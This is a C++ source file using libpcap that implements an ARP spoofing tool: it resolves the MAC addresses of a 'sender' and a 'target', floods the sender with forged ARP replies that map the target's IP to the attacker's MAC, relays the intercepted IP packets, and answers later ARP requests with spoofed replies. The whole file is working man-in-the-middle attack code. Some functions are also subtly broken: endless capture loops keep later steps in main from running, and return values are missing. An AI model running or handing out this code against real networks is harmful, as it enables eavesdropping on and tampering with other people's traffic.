#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <thread>
#include <unistd.h>

using namespace std;

int get_attacker_info(char* dev, u_char mac[], u_int* ip)
{
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (!ioctl(fd, SIOCGIFHWADDR, &ifr))
        memcpy(mac, (u_char*)ifr.ifr_hwaddr.sa_data, 6);

    if (!ioctl(fd, SIOCGIFADDR, &ifr))
        memcpy(ip, (u_char*)&(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr), 4);

    close(fd);

    return (0);
}

int get_mac_from_ip(pcap_t* handle, u_char self_mac[], u_int* self_ip, u_char target_mac[], u_int* target_ip)
{
    u_char s_packet[100];
    struct ethhdr* s_eth_hdr;
    struct ether_arp* s_arp_hdr;

    printf("Fetching MAC Address of %s...\n", inet_ntoa(*(struct in_addr*)target_ip));

    s_eth_hdr = (struct ethhdr*)s_packet;
    memset(s_eth_hdr->h_dest, -1, 6);
    memcpy(s_eth_hdr->h_source, self_mac, 6);
    s_eth_hdr->h_proto = htons(ETHERTYPE_ARP);

    s_arp_hdr = (struct ether_arp*)(s_packet + 14);
    s_arp_hdr->arp_hrd = htons(ARPHRD_ETHER);
    s_arp_hdr->arp_pro = htons(ETHERTYPE_IP);
    s_arp_hdr->arp_hln = 0x06;
    s_arp_hdr->arp_pln = 0x04;
    s_arp_hdr->arp_op = htons(0x0001);
    memcpy(s_arp_hdr->arp_sha, self_mac, 6);
    memset(s_arp_hdr->arp_tha, 0x00, 6);
    memcpy(s_arp_hdr->arp_spa, self_ip, 4);
    memcpy(s_arp_hdr->arp_tpa, target_ip, 4);

    while (1) {
        if (pcap_sendpacket(handle, s_packet, sizeof(struct ethhdr) + sizeof(struct ether_arp)) != 0) {
            fprintf(stderr, "Error! %s\n", pcap_geterr(handle));
            return (2);
        }
        printf("ARP Request Packet Sent to %s...\n", inet_ntoa(*(struct in_addr*)target_ip));

        struct pcap_pkthdr* header;
        const u_char* d_packet;
        int res, cnt = 0;

        while ((res = pcap_next_ex(handle, &header, &d_packet)) >= 0) {
            if (cnt >= 3)
                break;

            cnt++;

            if (res == 0)
                continue;

            struct ethhdr* d_eth_hdr;

            d_eth_hdr = (struct ethhdr*)d_packet;
            d_eth_hdr->h_proto = ntohs(d_eth_hdr->h_proto);

            if (d_eth_hdr->h_proto == ETHERTYPE_ARP) {
                struct ether_arp* d_arp_hdr;
                d_arp_hdr = (struct ether_arp*)(d_packet + 14);

                d_arp_hdr->arp_hrd = ntohs(d_arp_hdr->arp_hrd);
                d_arp_hdr->arp_pro = ntohs(d_arp_hdr->arp_pro);
                d_arp_hdr->arp_op = ntohs(d_arp_hdr->arp_op);

                if (d_arp_hdr->arp_op == 0x0002) {
                    if (!memcmp(d_arp_hdr->arp_spa, target_ip, 4)) {
                        memcpy(target_mac, d_arp_hdr->arp_sha, 6);
                        printf("ARP Reply Packet Received from %s!\n", inet_ntoa(*(struct in_addr*)target_ip));
                        printf("MAC Address of %s: %s\n", inet_ntoa(*(struct in_addr*)target_ip), ether_ntoa((struct ether_addr*)target_mac));
                        return (0);
                    }
                }
            }
        }
        printf("Failed to Fetch...Trying Again\n");
    }
    return (0);
}

int arp_storm(pcap_t* handle, u_char attacker_mac[], u_int* attacker_ip, u_char sender_mac[], u_int* sender_ip, u_char target_mac[], u_int* target_ip)
{
    printf("Performing ARP Storm for 10 seconds...\n");

    attacker_ip = attacker_ip;
    target_mac = target_mac;

    int cnt = 0;
    u_char s_packet[100];
    struct ethhdr* s_eth_hdr;
    struct ether_arp* s_arp_hdr;

    s_eth_hdr = (struct ethhdr*)s_packet;
    memcpy(s_eth_hdr->h_dest, sender_mac, 6);
    memcpy(s_eth_hdr->h_source, attacker_mac, 6);
    s_eth_hdr->h_proto = htons(ETHERTYPE_ARP);

    s_arp_hdr = (struct ether_arp*)(s_packet + 14);
    s_arp_hdr->arp_hrd = htons(ARPHRD_ETHER);
    s_arp_hdr->arp_pro = htons(ETHERTYPE_IP);
    s_arp_hdr->arp_hln = 0x06;
    s_arp_hdr->arp_pln = 0x04;
    s_arp_hdr->arp_op = htons(0x0002);
    memcpy(s_arp_hdr->arp_sha, attacker_mac, 6);
    memcpy(s_arp_hdr->arp_tha, sender_mac, 6);
    memcpy(s_arp_hdr->arp_spa, target_ip, 4);
    memcpy(s_arp_hdr->arp_tpa, sender_ip, 4);

    while (1) {
        if (cnt >= 2000)
            break;

        if (pcap_sendpacket(handle, s_packet, sizeof(struct ethhdr) + sizeof(struct ether_arp)) != 0) {
            fprintf(stderr, "Error! %s\n", pcap_geterr(handle));
            return (2);
        }
        usleep(5000);
        cnt++;
    }
}

int relay_packet(pcap_t* handle, u_char attacker_mac[], u_int* attacker_ip, u_char sender_mac[], u_int* sender_ip, u_char target_mac[], u_int* target_ip)
{
    printf("Performing Packet Relay...\n");

    struct pcap_pkthdr* header;
    const u_char* d_packet;
    int res;

    while ((res = pcap_next_ex(handle, &header, &d_packet)) >= 0) {
        if (res == 0)
            continue;

        struct ethhdr* d_eth_hdr;

        d_eth_hdr = (struct ethhdr*)d_packet;
        d_eth_hdr->h_proto = ntohs(d_eth_hdr->h_proto);

        if (d_eth_hdr->h_proto == ETHERTYPE_IP && !memcmp(d_eth_hdr->h_dest, attacker_mac, 6) && !memcmp(d_eth_hdr->h_source, sender_mac, 6)) {

            struct ip* d_ip_hdr;
            d_ip_hdr = (struct ip*)(d_packet + 14);

            if (!memcmp(&((d_ip_hdr->ip_src).s_addr), sender_ip, 4)) {
                printf("IP Packet Captured! Relaying...\n");
                d_eth_hdr->h_proto = htons(d_eth_hdr->h_proto);
                memcpy(d_eth_hdr->h_source, attacker_mac, 6);
                memcpy(d_eth_hdr->h_dest, target_mac, 6);
                if (pcap_sendpacket(handle, d_packet, header->len) != 0) {
                    fprintf(stderr, "Error! %s\n", pcap_geterr(handle));
                    return (2);
                }
            }
        }
    }
}

int reply_arp_request(pcap_t* handle, u_char attacker_mac[], u_int* attacker_ip, u_char sender_mac[], u_int* sender_ip, u_char target_mac[], u_int* target_ip)
{

    struct pcap_pkthdr* header;
    const u_char* d_packet;
    int res;

    while ((res = pcap_next_ex(handle, &header, &d_packet)) >= 0) {
        if (res == 0)
            continue;

        struct ethhdr* d_eth_hdr;

        d_eth_hdr = (struct ethhdr*)d_packet;
        d_eth_hdr->h_proto = ntohs(d_eth_hdr->h_proto);

        if (d_eth_hdr->h_proto == ETHERTYPE_ARP && !memcmp(d_eth_hdr->h_source, sender_mac, 6)) {
            printf("ARP Request Detected from Sender...\n");
            struct ether_arp* d_arp_hdr;
            d_arp_hdr = (struct ether_arp*)(d_packet + 14);
            d_eth_hdr->h_proto = htons(d_eth_hdr->h_proto);
            if (ntohs(d_arp_hdr->arp_op) == 0x0001) {
                memcpy(d_eth_hdr->h_dest, sender_mac, 6);
                memcpy(d_eth_hdr->h_source, attacker_mac, 6);
                d_arp_hdr->arp_op = htons(0x0002);
                memcpy(d_arp_hdr->arp_sha, attacker_mac, 6);
                memcpy(d_arp_hdr->arp_spa, target_ip, 4);
                memcpy(d_arp_hdr->arp_tha, sender_mac, 6);
                memcpy(d_arp_hdr->arp_tpa, sender_ip, 4);
                if (pcap_sendpacket(handle, d_packet, header->len) != 0) {
                    fprintf(stderr, "Error! %s\n", pcap_geterr(handle));
                    return (2);
                }
            }
        }
    }
}
int keep_arp_request(pcap_t* handle, u_char attacker_mac[], u_int* attacker_ip, u_char sender_mac[], u_int* sender_ip, u_char target_mac[], u_int* target_ip)
{

    struct pcap_pkthdr* header;
    const u_char* d_packet;
    int res;

    while ((res = pcap_next_ex(handle, &header, &d_packet)) >= 0) {
        if (res == 0)
            continue;

        struct ethhdr* d_eth_hdr;

        d_eth_hdr = (struct ethhdr*)d_packet;
        d_eth_hdr->h_proto = ntohs(d_eth_hdr->h_proto);

        if (d_eth_hdr->h_proto == ETHERTYPE_ARP && !memcmp(d_eth_hdr->h_source, target_mac, 6)) {
            printf("ARP Request Detected from Target...\n");
            printf("Sending ARP Request...\n");
            struct ether_arp* d_arp_hdr;
            d_arp_hdr = (struct ether_arp*)(d_packet + 14);
            d_eth_hdr->h_proto = htons(d_eth_hdr->h_proto);

            memcpy(d_arp_hdr->arp_sha, attacker_mac, 6);
            if (pcap_sendpacket(handle, d_packet, header->len) != 0) {
                fprintf(stderr, "Error! %s\n", pcap_geterr(handle));
                return (2);
            }
        }
    }
}

int main(int argc, char* argv[])
{
    pcap_t* handle;                /* Session handle */
    char dev[256];                 /* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE]; /* Error string */
    struct bpf_program fp;         /* The compiled filter */
    char filter_exp[] = "";        /* The filter expression */
    bpf_u_int32 mask;              /* Our netmask */
    bpf_u_int32 net;               /* Our IP */
    u_int sender_ip, target_ip, attacker_ip;
    u_char sender_mac[6], target_mac[6], attacker_mac[6];

    if (argc != 4) {
        printf("Usage: send_arp <interface> <sender ip> <target ip>\n");
        return (0);
    }

    strncpy(dev, argv[1], 256);
    inet_pton(AF_INET, argv[2], &sender_ip);
    inet_pton(AF_INET, argv[3], &target_ip);

    /* Find the properties for the device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
        net = 0;
        mask = 0;
    }
    /* Open the session in promiscuous mode */
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return (2);
    }
    /* Compile and apply the filter */
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return (2);
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return (2);
    }

    get_attacker_info(dev, attacker_mac, &attacker_ip);
    get_mac_from_ip(handle, attacker_mac, &attacker_ip, sender_mac, &sender_ip);
    get_mac_from_ip(handle, attacker_mac, &attacker_ip, target_mac, &target_ip);

    arp_storm(handle, attacker_mac, &attacker_ip, sender_mac, &sender_ip, target_mac, &target_ip);
    relay_packet(handle, attacker_mac, &attacker_ip, sender_mac, &sender_ip, target_mac, &target_ip);
    reply_arp_request(handle, attacker_mac, &attacker_ip, sender_mac, &sender_ip, target_mac, &target_ip);
    keep_arp_request(handle, attacker_mac, &attacker_ip, sender_mac, &sender_ip, target_mac, &target_ip);

    /* And close the session */
    pcap_close(handle);
    return (0);
}
